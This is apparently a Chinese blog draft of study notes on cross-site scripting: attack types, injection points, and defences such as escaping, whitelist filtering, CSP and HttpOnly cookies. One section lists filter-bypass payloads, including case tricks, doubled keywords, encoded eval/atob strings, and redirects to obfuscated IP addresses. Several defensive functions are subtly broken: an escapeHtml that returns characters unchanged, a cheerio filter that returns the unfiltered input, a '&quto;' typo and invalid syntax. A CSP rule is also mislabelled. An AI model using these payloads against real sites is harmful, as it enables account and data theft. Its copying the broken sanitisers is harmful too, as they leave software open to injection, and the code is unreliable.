---
title: XSS 跨站脚本攻击
date: 2020-11-21
draft: true
---

# XSS 跨站脚本攻击

XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中去。使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

## XSS 的攻击方式

`XSS`攻击的核心原理是：不需要你做任何的登录认证，它会通过合法的操作（比如在`url`中输入、在评论框中输入），向你的页面注入脚本（可能是`js`、`html`代码块等）。

### 反射型

> 发出请求时，`XSS`代码出现在`url`中，作为输入提交到服务器端，服务器端解析后响应，`XSS`代码随响应内容一起传回给浏览器，最后浏览器解析执行`XSS`代码。这个过程像一次反射，所以叫反射型`XSS`。

通过 url 参数直接注入。

发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务端解析后返回，XSS 代码随响应内容一起传回给浏览器，最后浏览器执行 XSS 代码。这个过程像一次反射，故叫做反射型 XSS。

**举个例子**

一个链接，里面的 query 字段中包含一个 script 标签，这个标签的 src 就是恶意代码，用户点击了这个链接后会先向服务器发送请求，服务器返回时也携带了这个 XSS 代码，然后浏览器将查询的结果写入 Html，这时恶意代码就被执行了。

并不是在 url 中没有包含 script 标签的网址都是安全的，可以使用[短网址](dwz.com)来让网址变得很短。

### 存储型

> 存储型`XSS`和反射型`XSS`的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求时目标页面时不用再提交 XSS 代码。

存储型 XSS 会被保存到数据库，在其他用户访问（前端）到这条数据时，这个代码会在访问用户的浏览器端执行。

**举个例子**

比如攻击者在一篇文章的评论中写入了 script 标签，这个评论被保存数据库，当其他用户看到这篇文章时就会执行这个脚本。

## XSS 攻击注入点

- HTML 节点内容
  - 如果一个节点内容是动态生成的，而这个内容中包含用户输入。
- HTML 属性
  - 某些节点属性值是由用户输入的内容生成的。那么可能会被封闭标签后添加 script 标签。

```html
<img src="${image}" /> <img src="1" onerror="alert(1)" />
```

- Javascript 代码
  - JS 中包含由后台注入的变量或用户输入的信息。

```js
var data = '#{data}';
var data = 'hello';
alert(1);
('');
```

- 富文本

## XSS 攻击的危害

> 最后导致的结果可能是：

- 盗用`Cookie`
- 破坏页面的正常结构，插入广告等恶意内容
- `D-doss`攻击

1. 获取页面数据
2. 获取 cookie
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站任意数据
6. 偷取用户资料
7. 偷取用户密码和登陆态
8. 欺骗用户
9. 显示伪造的文章或者图片

## XSS 防御

对于 XSS 攻击来说，通常有两种方式可以用来防御。

- 转义字符
- CSP 内容安全策略
- 设置 Cookie 为 HttpOnly

### XSS 的防范措施（encode + 过滤）

**XSS 的防范措施主要有三个：**

**1. 编码**：

> 对用户输入的数据进行`HTML Entity`编码。把字符转换成 转义字符。

> `Encode`的作用是将`$var`等一些字符进行转化，使得浏览器在最终输出结果上是一样的。

比如说这段代码：

```html
<script>
  alert(1);
</script>
```

> 若不进行任何处理，则浏览器会执行 alert 的 js 操作，实现 XSS 注入。
> 进行编码处理之后，在浏览器中的显示结果就是`<script>alert(1)</script>`，实现了将`$var`作为纯文本进行输出，且不引起 J`avaScript`的执行。

**2、过滤：**

- 移除用户输入的和事件相关的属性。如`onerror`可以自动触发攻击，还有`onclick`等。（总而言是，过滤掉一些不安全的内容）
- 移除用户输入的`Style`节点、`Script`节点、`Iframe`节点。（尤其是`Script`节点，它可是支持跨域的呀，一定要移除）。

**3、校正**

- 避免直接对`HTML Entity`进行解码。
- 使用`DOM Parse`转换，校正不配对的`DOM`标签。

比较常用的做法是，通过第一步的编码转成文本，然后第三步转成`DOM`对象，然后经过第二步的过滤。

**还有一种简洁的答案：**

首先是 encode，如果是富文本，就白名单。

### 转义字符

- 普通的输入 - 编码

  - 对用户输入数据进行 HTML Entity 编码（使用转义字符）
  - "
  - &
  - <
  - \>
  - 空格

- 富文本 - 过滤（黑名单、白名单）

  - 移除上传的 DOM 属性，如 onerror 等
  - 移除用户上传的 style 节点、script 节点、iframe 节点等

- 较正
  - 避免直接对 HTML Entity 解码
  - 使用 DOM Parse 转换，校正不配对的 DOM 标签和属性

#### 对于会在 DOM 中出现的字符串（用户数据）：

< 转义为 \&lt;

> 转义为 \&gt;

#### 对于可能出现在 DOM 元素属性上的数据

" 转义为 \&quot;
' 转义为 \&9039;
空格转义为 \&nbsp; 但这可能造成多个连续的空格，也可以不对空格转义，但是一定要为属性加双引号

& 这个字符如果要转义，那么一定要放在转移函数的第一个来做

#### 避免 JS 中的插入

```js
var data = '#{data}';
var data = 'hello';
alert(1);
('');
```

因为是用引号将变量包裹起来的，而且被攻击也因为引号被提前结束，所以要做的就是将引号转义

```
先 \\ -> \\\\
再 " -> \\"
```

#### 富文本

按照黑名单过滤： script 等
但是 html 标签中能执行 html 代码的属性太多了，比如 onclick, onhover,onerror, <a href="jacascript:alert(1)">

```js
function xssFilter = function (html) {
  html = html.replace(/<\s*\/?script\s*>/g, '');
  html = html.repalce(/javascript:[^'"]/g, '');
  html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/g, '');
  //....
  return html;
}
```

按照白名单过滤： 只允许某些标签和属性存在

做法：将 HTML 解析成树状结构，对于这个 DOM 树，一个一个的去看是否存在合法的标签和属性，如果不是就去掉。

使用 cheerio 就可以快速的解析 DOM

```js
function xssFilter(html) {
  const cheerio = require('cheerio');
  const $ = cheerio.load(html);

  //白名单
  const whiteList = { img: ['src'] };

  $('*').each((index, elem) => {
    if (!whiteList[elem.name]) {
      $(elem).remove();
      return;
    }
    for (let attr in elem.attribs) {
      if (whiteList[elem.name].indexOf(attr) === -1) {
        $(elem).attr(attr, null);
      }
    }
  });
  return html;
}
```

### CSP 内容安全策略

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

通常可以通过两种方式来开启 CSP：

- 设置 HTTP Header 中的 Content-Security-Policy
- 设置 meta 标签的方式 `<meta http-equiv="Content-Security-Policy">`

以设置 HTTP Header 来举例

- 只允许加载本站资源

```
Content-Security-Policy: default-src ‘self’
```

- 图片只允许加载 HTTPS 协议

```
Content-Security-Policy: img-src https://*
```

- 允许加载任何来源框架

```
Content-Security-Policy: child-src 'none'
```

[CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) ( Content Security Policy )

### 设置 Cookie 为 HttpOnly

设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。

### 检查 Referer 首部字段

Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。

这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

### 添加校验 Token

在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

### 输入验证码

因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

### 需要处理哪些字符？

需要过滤 >、<、& ？

# 有过滤的情况下

## 过滤空格

用`/`代替空格

<img/src\="x"/onerror\=alert("xss");\>

## 过滤关键字

### 大小写绕过

<ImG sRc\=x onerRor\=alert("xss");\>

### 双写关键字

有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

<imimgg srsrcc\=x onerror\=alert("xss");\>

### 字符拼接

利用 eval

<img src\="x" onerror\="a=\`aler\`;b=\`t\`;c='(\`xss\`);';eval(a+b+c)"\>

利用 top

    <script>top["al"+"ert"](`xss`);</script>

### 其它字符混淆

有的 waf 可能是用正则表达式去检测是否有 xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子

    可利用注释、标签的优先级等
    1.<<script>alert("xss");//<</script>
    2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
    3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>

### 编码绕过

Unicode 编码绕过

<img src\="x" onerror\="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;"\>

<img src\="x" onerror\="eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b')"\>

url 编码绕过

<img src\="x" onerror\="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"\>

    <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii 码绕过

<img src\="x" onerror\="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"\>

hex 绕过

    <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制

    <img src=x onerror=alert('\170\163\163')>

base64 绕过

    <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">

    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

## 过滤双引号，单引号

1.如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号

    <img src="x" onerror=alert(`xss`);>

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了

## 过滤括号

当括号被过滤的时候可以使用 throw 来绕过

    <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">

## 过滤 url 地址

### 使用 url 编码

    <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>

### 使用 IP

1.十进制 IP

    <img src="x" onerror=document.location=`http://2130706433/`>

2.八进制 IP

    <img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex

    <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>

4.html 标签中用`//`可以代替`http://`

    <img src="x" onerror=document.location=`//www.baidu.com`>

5.使用`\\`

    但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议

Windows 下
![](https://xzfile.aliyuncs.com/media/upload/picture/20190208102122-3a40fff4-2b48-1.gif)
Linux 下
![](https://xzfile.aliyuncs.com/media/upload/picture/20190208103630-5775e02e-2b4a-1.gif) 6.使用中文逗号代替英文逗号
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号

    <img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度

### XSS

什么是 XSS 攻击？如何防范 XSS 攻击？什么是 CSP？

XSS 简单点来说，就是攻击者想尽一切办法将可以执行的代码注入到网页中。

XSS 可以分为多种类型，但是总体上我认为分为两类：**持久型和非持久型**。

持久型也就是攻击的代码被服务端写入进**数据库**中，这种攻击危害性很大，因为如果网站访问量很大的话，就会导致大量正常访问页面的用户都受到攻击。

举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容

![img](https://wire.cdn-go.cn/wire-cdn/b23befc0/blog/images/1676a843648d488c.jpg)

这种情况如果前后端没有做好防御的话，这段评论就会被存储到数据库中，这样每个打开该页面的用户都会被攻击到。

非持久型相比于前者危害就小的多了，一般通过**修改 URL 参数**的方式加入攻击代码，诱导用户访问链接从而进行攻击。

举个例子，如果页面需要从 URL 中获取某些参数作为内容的话，不经过过滤就会导致攻击代码被执行

```
<!-- http://www.domain.com?name=<script>alert(1)</script> -->
<div>{{name}}</div>
```

但是对于这种攻击方式来说，如果用户使用 Chrome 这类浏览器的话，浏览器就能自动帮助用户防御攻击。但是我们不能因此就不防御此类攻击了，因为我不能确保用户都使用了该类浏览器。

![img](https://wire.cdn-go.cn/wire-cdn/b23befc0/blog/images/1676d5e1a09c8367.jpg)

对于 XSS 攻击来说，通常有两种方式可以用来防御。

#### 转义字符

首先，对于用户的输入应该是永远不信任的。最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;');
  str = str.replace(/</g, '&lt;');
  str = str.replace(/>/g, '&gt;');
  str = str.replace(/"/g, '&quto;');
  str = str.replace(/'/g, '&#39;');
  str = str.replace(/`/g, '&#96;');
  str = str.replace(/\//g, '&#x2F;');
  return str;
}
```

通过转义可以将攻击代码 `<script>alert(1)</script>` 变成

```js
// -> &lt;script&gt;alert(1)&lt;&#x2F;script&gt;
escape('<script>alert(1)</script>');
```

但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。

```js
const xss = require('xss');
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>');
// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html);
```

以上示例使用了 `js-xss` 来实现，可以看到在输出中保留了 `h1` 标签且过滤了 `script` 标签。

#### CSP

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

通常可以通过两种方式来开启 CSP：

1. 设置 HTTP Header 中的 `Content-Security-Policy`
2. 设置 `meta` 标签的方式 `<meta http-equiv="Content-Security-Policy">`

这里以设置 HTTP Header 来举例

- 只允许加载本站资源

  ```js
  Content-Security-Policy: default-src ‘self’
  ```

- 只允许加载 HTTPS 协议图片

  ```js
  Content-Security-Policy: img-src https://*
  ```

- 允许加载任何来源框架

  ```js
  Content-Security-Policy: child-src 'none'
  ```

当然可以设置的属性远不止这些，你可以通过查阅 [文档](https://link.juejin.im/?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FHeaders%2FContent-Security-Policy) 的方式来学习，这里就不过多赘述其他的属性了。

对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。

![img](https://wire.cdn-go.cn/wire-cdn/b23befc0/blog/images/1676d8215a3d1f5b.jpg)

### XSS

> **跨网站指令码**（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是[代码注入](https://www.wikiwand.com/zh-hans/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%85%A5)的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了 HTML 以及使用者端脚本语言。

XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中去。使别的用户访问都会执行相应的嵌入代码。

从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

XSS 了解吗？为了防范 XSS，需要处理哪些字符？ 跨站点脚本攻击；需要过滤 >、<、& ？

> `XSS`攻击的核心原理是：不需要你做任何的登录认证，它会通过合法的操作（比如在`url`中输入、在评论框中输入），向你的页面注入脚本（可能是`js`、`html`代码块等）。

> 最后导致的结果可能是：

- 盗用`Cookie`
- 破坏页面的正常结构，插入广告等恶意内容
- `D-doss`攻击

XSS 分为三种：反射型，存储型和 DOM-based

1. 反射型

> 发出请求时，`XSS`代码出现在`url`中，作为输入提交到服务器端，服务器端解析后响应，`XSS`代码随响应内容一起传回给浏览器，最后浏览器解析执行`XSS`代码。这个过程像一次反射，所以叫反射型`XSS`。

2. 存储型

> 存储型`XSS`和反射型`XSS`的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求时目标页面时不用再提交 XSS 代码。

#### XSS 攻击的危害包括：

1. 获取页面数据
2. 获取 cookie
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站任意数据
6. 偷取用户资料
7. 偷取用户密码和登陆态
8. 欺骗用户
9. 显示伪造的文章或者图片

#### 如何攻击

XSS 通过修改 HTML 节点或者执行 JS 代码来攻击网站。

例如通过 URL 获取某些参数

```html
<!-- http://www.domain.com?name=<script>alert(1)</script> -->
<div>{{name}}</div>
```

上述 URL 输入可能会将 HTML 改为 `<div><script>alert(1)</script></div>` ，这样页面中就凭空多了一段可执行脚本。这种攻击类型是反射型攻击，也可以说是 DOM-based 攻击。

也有另一种场景，比如写了一篇包含攻击代码 `<script>alert(1)</script>` 的文章，那么可能浏览文章的用户都会被攻击到。这种攻击类型是存储型攻击，也可以说是 DOM-based 攻击，并且这种攻击打击面更广。

##### 反射型

通过 url 参数直接注入。

发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务端解析后返回，XSS 代码随响应内容一起传回给浏览器，最后浏览器执行 XSS 代码。这个过程像一次反射，故叫做反射型 XSS。

**举个例子**

一个链接，里面的 query 字段中包含一个 script 标签，这个标签的 src 就是恶意代码，用户点击了这个链接后会先向服务器发送请求，服务器返回时也携带了这个 XSS 代码，然后浏览器将查询的结果写入 Html，这时恶意代码就被执行了。

并不是在 url 中没有包含 script 标签的网址都是安全的，可以使用[短网址](dwz.com)来让网址变得很短。

##### 存储型

存储型 XSS 会被保存到数据库，在其他用户访问（前端）到这条数据时，这个代码会在访问用户的浏览器端执行。

**举个例子**

比如攻击者在一篇文章的评论中写入了 script 标签，这个评论被保存数据库，当其他用户看到这篇文章时就会执行这个脚本。

#### XSS 攻击注入点

- HTML 节点内容
  - 如果一个节点内容是动态生成的，而这个内容中包含用户输入。
- HTML 属性
  - 某些节点属性值是由用户输入的内容生成的。那么可能会被封闭标签后添加 script 标签。

```html
<img src="${image}" /> <img src="1" onerror="alert(1)" />
```

- Javascript 代码
  - JS 中包含由后台注入的变量或用户输入的信息。

```js
var data = '#{data}';
var data = 'hello';
alert(1);
('');
```

- 富文本

#### 如何防御

对于 XSS 攻击来说，通常有两种方式可以用来防御。

- 转义字符
- CSP 内容安全策略
- 设置 Cookie 为 HttpOnly

**XSS 的防范措施主要有三个：**

**1. 编码**：

> 对用户输入的数据进行`HTML Entity`编码。

如上图所示，把字符转换成 转义字符。

> `Encode`的作用是将`$var`等一些字符进行转化，使得浏览器在最终输出结果上是一样的。

比如说这段代码：

```html
<script>
  alert(1);
</script>
```

> 若不进行任何处理，则浏览器会执行 alert 的 js 操作，实现 XSS 注入。

> 进行编码处理之后，L 在浏览器中的显示结果就是`<script>alert(1)</script>`，实现了将``\$var`作为纯文本进行输出，且不引起J`avaScript`的执行。

**2、过滤：**

- 移除用户输入的和事件相关的属性。如`onerror`可以自动触发攻击，还有`onclick`等。（总而言是，过滤掉一些不安全的内容）
- 移除用户输入的`Style`节点、`Script`节点、`Iframe`节点。（尤其是`Script`节点，它可是支持跨域的呀，一定要移除）。

**3、校正**

- 避免直接对`HTML Entity`进行解码。
- 使用`DOM Parse`转换，校正不配对的`DOM`标签。

> 备注：我们应该去了解一下`DOM Parse`这个概念，它的作用是把文本解析成`DOM`结构。

比较常用的做法是，通过第一步的编码转成文本，然后第三步转成`DOM`对象，然后经过第二步的过滤。

**还有一种简洁的答案：**

首先是 encode，如果是富文本，就白名单。

最普遍的做法是转义输入输出的内容，对于引号，尖括号，斜杠进行转义

#### 转义字符

- 普通的输入 - 编码

  - 对用户输入数据进行 HTML Entity 编码（使用转义字符）
  - "
  - &
  - <
  - \>
  - 空格

- 富文本 - 过滤（黑名单、白名单）

  - 移除上传的 DOM 属性，如 onerror 等
  - 移除用户上传的 style 节点、script 节点、iframe 节点等

- 较正
  - 避免直接对 HTML Entity 解码
  - 使用 DOM Parse 转换，校正不配对的 DOM 标签和属性

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;');
  str = str.replace(/</g, '&lt;');
  str = str.replace(/>/g, '&gt;');
  str = str.replace(/"/g, '&quto;');
  str = str.replace(/'/g, '&#39;');
  str = str.replace(/`/g, '&#96;');
  str = str.replace(/\//g, '&#x2F;');
  return str;
}
```

通过转义可以将攻击代码 `<script>alert(1)</script>` 变成

```js
// -> &lt;script&gt;alert(1)&lt;&#x2F;script&gt;
escape('<script>alert(1)</script>');
```

对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。

```js
var xss = require('xss');
var html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>');
// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html);
```

以上示例使用了 `js-xss` 来实现。可以看到在输出中保留了 `h1` 标签且过滤了 `script` 标签

#### CSP

> 内容安全策略 ([CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP)) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。

我们可以通过 CSP 来尽量减少 XSS 攻击。CSP 本质上也是建立白名单，规定了浏览器只能够执行特定来源的代码。

通常可以通过 HTTP Header 中的 `Content-Security-Policy` 来开启 CSP

- 只允许加载本站资源

  ```http
  Content-Security-Policy: default-src ‘self’
  ```

- 只允许加载 HTTPS 协议图片

  ```http
  Content-Security-Policy: img-src https://*
  ```

- 允许加载任何来源框架

  ```http
  Content-Security-Policy: child-src 'none'
  ```

更多属性可以查看 [这里](https://content-security-policy.com/)

### XSS 是什么，攻击原理，怎么预防

#### XSS 是什么

XSS 是一种跨站脚本攻击，是属于代码注入的一种，攻击者通过将代码注入网页中，其他用户看到会受到影响(代码内容有请求外部服务器);

#### xss 攻击分类：

- 反射型：攻击者构造一个带有恶意代码的 url 链接诱导正常用户点击，服务器接收到这个 url 对应的请求读取出其中的参数然后没有做过滤就拼接到 Html 页面发送给浏览器，浏览器解析执行
- 存储型： 攻击者将带有恶意代码的内容发送给服务器（比如在论坛上发帖），服务器没有做过滤就将内容存储到数据库中，下次再请求这个页面的时候服务器从数据库中读取出相关的内容拼接到 html 上，浏览器收到之后解析执行
- dom 型：dom 型 xss 主要和前端 js 有关，是前端 js 获取到用户的输入没有进行过滤然后拼接到 html 中

#### 扩展

CSRF 是一种跨站请求伪造，冒充用户发起请求，完成一些违背用户请求的行为(删帖，改密码，发邮件，发帖等)

#### 防御方法举例:

- 使用 encodeURIComponent 对 url 中的参数进行编码(反射型 xss)，对一些关键字和特殊字符进行过滤(<>,?,script 等)，或对用户输入内容进行 URL 编码(encodeURIComponent);
- Cookie 不要存放用户名和密码，对 cookie 信息进行 MD5 等算法散列存放，必要时可以将 IP 和 cookie 绑定;
- 对用户的输入进行过滤(适用于所有类型的 xss 攻击)
- 对用户的输入使用 innerText 或者 textContent 进行设置，而不是使用 innerHTML 或者 outerHTML 进行设置
- 服务器端设置 cookie 为 httpOnly 让前端无法通过 js 获取到用户的 cookie
- 关键请求使用验证码，比如转账请求，避免恶意脚本发送这些关键请求

## 最好不使用 vue 的 v-html ？

### 请写一个函数 escapeHtml，将<, >, &, "进行转义

```js
function escapeHtml(str) {
  return str.replace(/[<>&]/g, function(match) {
    switch (match) {
      case '<':
        return '<';
      case '>':
        return '>';
      case '&':
        return '&';
      case '\\':
        return '';
    }
  });
}
```
